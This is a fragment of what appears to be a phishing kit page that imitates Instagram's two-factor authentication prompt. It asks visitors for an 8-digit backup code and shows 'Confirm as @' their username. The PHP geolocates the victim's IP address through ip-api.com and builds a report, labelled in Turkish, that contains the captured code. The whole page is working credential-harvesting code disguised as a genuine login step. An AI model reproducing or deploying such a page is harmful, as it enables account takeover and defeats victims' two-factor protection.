...
$konum = file_get_contents("http://ip-api.com/xml/".$_SERVER['REMOTE_ADDR']);$cek = new SimpleXMLElement($konum);$ulke=$cek->country;$sehir = $cek->city;
    ...
    <font color='red'>Faktör Kodu: </font><font color='black'>".$zwoua."</font><br>
<hr>
"); 
...
<form class="sign-in-form">
    ...
    <p>Enter one of the 8 digit backup codes for two factor authentication.</p>
    <br>
    <br>
          
         <div class="wrap-input100 validate-input"> <input class="input100" type="number" required="" name="zwoua" placeholder="Backup Code"> <span class="focus-input100"></span> <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span> </div>
                 
   <div class="container-login100-form-btn" style="margin-top:-20px;">
<button type="submit" id="imagei" class="btn">Confirm as @<?php echo $id ?> </button>
   <br><br>
        <a href="https://www.facebook.com/help/instagram/354736791367645">
            <input type="button" class="btn" value="I don't have two-factor security">
            	<br><br><br>
</form>
			</div>
		</div>
